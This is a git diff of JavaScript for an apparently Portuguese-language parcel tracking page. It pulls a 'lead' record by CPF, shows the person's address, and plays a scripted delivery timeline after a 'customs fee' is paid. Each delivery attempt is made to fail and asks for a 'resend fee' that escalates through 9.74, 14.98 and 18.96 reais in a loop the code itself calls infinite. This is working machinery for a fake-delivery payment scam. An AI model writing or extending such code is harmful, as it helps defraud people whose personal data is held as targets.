@@ -391,10 +391,38 @@ export class TrackingSystem {
         this.updateElement('formattedCpf', formattedCPF);
         this.updateElement('customerNameStatus', shortName);
         
+        // Buscar dados completos do lead no banco
+        this.loadCompleteOrderData();
+        
         console.log('✅ Interface atualizada com nome:', shortName);
         // Mostrar seções
         this.showElement('orderDetails');
         this.showElement('trackingResults');
+    }
+    
+    async loadCompleteOrderData() {
+        if (!this.currentCPF) return;
+        
+        try {
+            const { DatabaseService } = await import('../services/database.js');
+            const dbService = new DatabaseService();
+            const result = await dbService.getLeadByCPF(this.currentCPF);
+            
+            if (result.success && result.data) {
+                const leadData = result.data;
+                console.log('📦 Dados completos do lead:', leadData);
+                
+                // Atualizar dados do pedido com informações completas
+                this.updateElement('customerDocument', CPFValidator.formatCPF(leadData.cpf));
+                this.updateElement('customerProduct', leadData.produtos?.[0]?.nome || 'Kit 12 caixas organizadoras + brinde');
+                this.updateElement('customerFullAddress', leadData.endereco || 'Endereço não informado');
+                
+                // Mostrar seção de informações do pedido
+                this.showElement('orderInfoSection');
+            }
+        } catch (error) {
+            console.error('❌ Erro ao carregar dados completos:', error);
+        }
     }
 
     generateTrackingData() {
@@ -913,7 +941,7 @@ export class TrackingSystem {
         }
     }
     
-    // Processar pagamento com sucesso
+    // Processar pagamento com sucesso e iniciar fluxo pós-liberação
     processSuccessfulPayment() {
         // Marcar como pago
         if (this.trackingData) {
@@ -932,15 +960,281 @@ export class TrackingSystem {
         // Mostrar notificação de sucesso
         this.showSuccessNotification();
         
-        // Iniciar fluxo pós-pagamento
+        // Iniciar fluxo pós-liberação com etapas específicas
         setTimeout(() => {
-            // Importar e inicializar sistema pós-pagamento
-            import('../components/post-payment-system.js').then(module => {
-                const PostPaymentSystem = module.PostPaymentSystem;
-                const postPaymentSystem = new PostPaymentSystem(this);
-                postPaymentSystem.startPostPaymentFlow();
-            });
+            this.startPostLiberationFlow();
         }, 1000);
+    }
+    
+    // Fluxo pós-liberação alfandegária
+    startPostLiberationFlow() {
+        console.log('🚀 Iniciando fluxo pós-liberação...');
+        
+        // Etapa 12: Liberado na alfândega
+        this.addTimelineStep({
+            stepNumber: 12,
+            title: 'Pedido liberado na alfândega de importação',
+            description: 'Seu pedido foi liberado após o pagamento da taxa alfandegária',
+            delay: 0
+        });
+        
+        // Etapa 13: Sairá para entrega (2h)
+        this.addTimelineStep({
+            stepNumber: 13,
+            title: 'Pedido sairá para entrega para seu endereço',
+            description: 'Pedido sairá para entrega para seu endereço',
+            delay: 2 * 60 * 60 * 1000
+        });
+        
+        // Etapa 14: Em trânsito (4h)
+        this.addTimelineStep({
+            stepNumber: 14,
+            title: 'Pedido em trânsito para seu endereço',
+            description: 'Pedido em trânsito para seu endereço',
+            delay: 4 * 60 * 60 * 1000
+        });
+        
+        // Etapa 15: Rota de entrega (6h)
+        this.addTimelineStep({
+            stepNumber: 15,
+            title: 'Pedido em rota de entrega para seu endereço, aguarde',
+            description: 'Pedido em rota de entrega para seu endereço, aguarde',
+            delay: 6 * 60 * 60 * 1000
+        });
+        
+        // Etapa 16: Tentativa de entrega (8h)
+        this.addTimelineStep({
+            stepNumber: 16,
+            title: 'Tentativa de entrega',
+            description: 'Tentativa de entrega realizada, mas não foi possível entregar',
+            delay: 8 * 60 * 60 * 1000,
+            isDeliveryAttempt: true,
+            deliveryValue: 9.74
+        });
+    }
+    
+    // Adicionar nova etapa na timeline
+    addTimelineStep({ stepNumber, title, description, delay, isDeliveryAttempt = false, deliveryValue = 0 }) {
+        setTimeout(() => {
+            console.log(`📦 Adicionando etapa ${stepNumber}: ${title}`);
+            
+            const timeline = document.getElementById('trackingTimeline');
+            if (!timeline) return;
+
+            const stepDate = new Date();
+            const timelineItem = this.createDeliveryTimelineItem({
+                stepNumber,
+                title,
+                description,
+                date: stepDate,
+                completed: true,
+                isDeliveryAttempt,
+                deliveryValue
+            });
+
+            timeline.appendChild(timelineItem);
+
+            // Animar entrada da nova etapa
+            setTimeout(() => {
+                timelineItem.style.opacity = '1';
+                timelineItem.style.transform = 'translateY(0)';
+            }, 100);
+
+            // Scroll para a nova etapa
+            timelineItem.scrollIntoView({ 
+                behavior: 'smooth', 
+                block: 'center' 
+            });
+
+        }, delay);
+    }
+    
+    // Criar item da timeline para entrega
+    createDeliveryTimelineItem({ stepNumber, title, description, date, completed, isDeliveryAttempt, deliveryValue }) {
+        const item = document.createElement('div');
+        item.className = `timeline-item ${completed ? 'completed' : ''}`;
+        item.style.opacity = '0';
+        item.style.transform = 'translateY(20px)';
+        item.style.transition = 'all 0.5s ease';
+
+        const dateStr = date.toLocaleDateString('pt-BR', { day: '2-digit', month: 'short' });
+        const timeStr = date.toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' });
+
+        let buttonHtml = '';
+        
+        if (isDeliveryAttempt) {
+            buttonHtml = `
+                <button class="liberation-button-timeline delivery-retry-btn" data-value="${deliveryValue}">
+                    <i class="fas fa-redo"></i> Reenviar Pacote (R$ ${deliveryValue.toFixed(2)})
+                </button>
+            `;
+        }
+
+        item.innerHTML = `
+            <div class="timeline-dot"></div>
+            <div class="timeline-content">
+                <div class="timeline-date">
+                    <span class="date">${dateStr}</span>
+                    <span class="time">${timeStr}</span>
+                </div>
+                <div class="timeline-text">
+                    <p>${description}</p>
+                    ${buttonHtml}
+                </div>
+            </div>
+        `;
+
+        // Configurar eventos dos botões de reenvio
+        if (isDeliveryAttempt) {
+            const retryButton = item.querySelector('.delivery-retry-btn');
+            if (retryButton) {
+                retryButton.addEventListener('click', () => {
+                    this.handleDeliveryRetry(deliveryValue, retryButton);
+                });
+            }
+        }
+
+        return item;
+    }
+    
+    // Lidar com reenvio de entrega
+    handleDeliveryRetry(value, button) {
+        console.log(`🔄 Processando reenvio - R$ ${value.toFixed(2)}`);
+        
+        // Mostrar modal de pagamento de reenvio
+        this.showDeliveryPaymentModal(value, button);
+    }
+    
+    // Modal de pagamento de reenvio
+    showDeliveryPaymentModal(value, button) {
+        const modal = document.createElement('div');
+        modal.className = 'modal-overlay';
+        modal.id = 'deliveryPaymentModal';
+        modal.style.display = 'flex';
+        
+        modal.innerHTML = `
+            <div class="professional-modal-container">
+                <div class="professional-modal-header">
+                    <h2 class="professional-modal-title">Taxa de Reenvio</h2>
+                    <button class="professional-modal-close" id="closeDeliveryPaymentModal">
+                        <i class="fas fa-times"></i>
+                    </button>
+                </div>
+                
+                <div class="professional-modal-content">
+                    <div class="liberation-explanation">
+                        <p class="liberation-subtitle">
+                            Para reagendar a entrega do seu pedido, é necessário pagar a taxa de reenvio de R$ ${value.toFixed(2)}.
+                        </p>
+                    </div>
+
+                    <div class="professional-fee-display">
+                        <div class="fee-info">
+                            <span class="fee-label">Taxa de Reenvio</span>
+                            <span class="fee-amount">R$ ${value.toFixed(2)}</span>
+                        </div>
+                    </div>
+                    
+                    <div style="text-align: center; margin-top: 20px;">
+                        <button id="simulateDeliveryPayment" class="liberation-button-timeline">
+                            <i class="fas fa-credit-card"></i> Simular Pagamento
+                        </button>
+                    </div>
+                </div>
+            </div>
+        `;
+        
+        document.body.appendChild(modal);
+        document.body.style.overflow = 'hidden';
+        
+        // Configurar eventos
+        const closeButton = modal.querySelector('#closeDeliveryPaymentModal');
+        const payButton = modal.querySelector('#simulateDeliveryPayment');
+        
+        closeButton.addEventListener('click', () => {
+            this.closeDeliveryPaymentModal();
+        });
+        
+        payButton.addEventListener('click', () => {
+            this.processDeliveryPayment(value, button);
+        });
+        
+        modal.addEventListener('click', (e) => {
+            if (e.target === modal) {
+                this.closeDeliveryPaymentModal();
+            }
+        });
+    }
+    
+    // Processar pagamento de reenvio
+    processDeliveryPayment(value, button) {
+        this.closeDeliveryPaymentModal();
+        
+        // Ocultar botão atual
+        button.closest('.timeline-item').style.display = 'none';
+        
+        // Mostrar notificação de sucesso
+        this.showSuccessNotification('Reenvio confirmado!', 'Nova tentativa de entrega agendada.');
+        
+        // Iniciar novo ciclo de entrega
+        setTimeout(() => {
+            this.startNewDeliveryAttempt(this.getNextDeliveryValue(value));
+        }, 2000);
+    }
+    
+    // Obter próximo valor de entrega
+    getNextDeliveryValue(currentValue) {
+        const values = [9.74, 14.98, 18.96];
+        const currentIndex = values.indexOf(currentValue);
+        return currentIndex < values.length - 1 ? values[currentIndex + 1] : values[0]; // Loop infinito
+    }
+    
+    // Iniciar nova tentativa de entrega
+    startNewDeliveryAttempt(nextValue) {
+        console.log('🚚 Iniciando nova tentativa de entrega...');
+        
+        // Sairá para entrega (2h)
+        this.addTimelineStep({
+            stepNumber: 100 + Math.random(), // ID único
+            title: 'Pedido sairá para entrega',
+            description: 'Seu pedido está sendo preparado para nova tentativa de entrega',
+            delay: 2 * 60 * 60 * 1000
+        });
+        
+        // Em trânsito (4h)
+        this.addTimelineStep({
+            stepNumber: 101 + Math.random(),
+            title: 'Pedido em trânsito',
+            description: 'Pedido em trânsito para seu endereço',
+            delay: 4 * 60 * 60 * 1000
+        });
+        
+        // Rota de entrega (6h)
+        this.addTimelineStep({
+            stepNumber: 102 + Math.random(),
+            title: 'Pedido em rota de entrega',
+            description: 'Pedido em rota de entrega para seu endereço, aguarde',
+            delay: 6 * 60 * 60 * 1000
+        });
+        
+        // Nova tentativa (8h)
+        this.addTimelineStep({
+            stepNumber: 103 + Math.random(),
+            title: 'Tentativa de entrega',
+            description: 'Nova tentativa de entrega realizada, mas não foi possível entregar',
+            delay: 8 * 60 * 60 * 1000,
+            isDeliveryAttempt: true,
+            deliveryValue: nextValue
+        });
+    }
+    
+    // Fechar modal de pagamento de entrega
+    closeDeliveryPaymentModal() {
+        const modal = document.getElementById('deliveryPaymentModal');
+        if (modal) {
+            modal.remove();
+            document.body.style.overflow = 'auto';
+        }
     }
     
     // Atualizar status de pagamento no banco de dados
@@ -961,8 +1255,8 @@ export class TrackingSystem {
         }
     }
     
-    // Mostrar notificação de sucesso
-    showSuccessNotification() {
+    // Mostrar notificação de sucesso personalizada
+    showSuccessNotification(title = 'Pagamento confirmado!', message = 'Objeto liberado com sucesso.') {
         const notification = document.createElement('div');
         notification.className = 'payment-success-notification';
         notification.style.cssText = `
@@ -985,8 +1279,8 @@ export class TrackingSystem {
         notification.innerHTML = `
             <i class="fas fa-check-circle" style="font-size: 1.2rem;"></i>
             <div>
-                <div style="font-weight: 600; margin-bottom: 2px;">Pagamento confirmado!</div>
-                <div style="font-size: 0.9rem; opacity: 0.9;">Objeto liberado com sucesso.</div>
+                <div style="font-weight: 600; margin-bottom: 2px;">${title}</div>
+                <div style="font-size: 0.9rem; opacity: 0.9;">${message}</div>
             </div>
         `;
         
@@ -1288,7 +1582,7 @@ export class TrackingSystem {
             
             // Atualizar com dados reais do usuário
             this.updateElement('orderCustomerName', this.userData.nome || 'Nome não informado');
-            this.updateElement('orderDeliveryAddress', 'Rua das Flores, 123 - Centro - São Paulo/SP - CEP: 01234-567');
+            this.updateElement('orderDeliveryAddress', this.userData.endereco || 'Endereço não informado');
             this.updateElement('orderProductName', 'Kit 12 caixas organizadoras + brinde');
             this.updateElement('orderCustomsStatus', this.trackingData?.liberationPaid ? 'Pago' : 'Pendente');
         }
